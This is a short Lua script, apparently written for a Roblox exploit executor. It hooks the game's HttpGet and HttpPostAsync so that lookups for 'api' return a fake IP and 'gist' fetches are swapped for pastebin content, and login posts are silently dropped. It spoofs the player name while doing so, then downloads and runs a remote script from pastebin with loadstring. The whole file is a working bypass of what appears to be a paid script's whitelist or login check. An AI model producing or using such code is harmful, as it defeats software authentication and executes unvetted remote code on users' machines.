--GET
local og = game.Players.LocalPlayer.Name
game.Players.LocalPlayer.Name = "DOGEVERFTW"

local getHook = newcclosure(function(self, i, v, ...)
    if string.find(i ,"api") then 
    return "173.48.222.110"
    end
     if string.find(i ,"gist") then 
    return game:HttpGet("https://pastebin.com/raw/Y0MZGiRV")
    end
    return httpG(self, i, v, ...)
end)

local oof = newcclosure(function(self, i, v, ...)
    print("OOFING LOGIN")
    local args = {...}
end)

local mt = getrawmetatable(game)
local __index = mt.__index
setreadonly(mt, false)

mt.__index = function(self, index)
    if index == "HttpGet" then
        return getHook
    elseif index == "HttpPostAsync" then 
        return oof
    end
    return __index(self, index)
end

loadstring(game:HttpGet("https://pastebin.com/raw/Bgj0zpVK"))()
game.Players.LocalPlayer.Name = og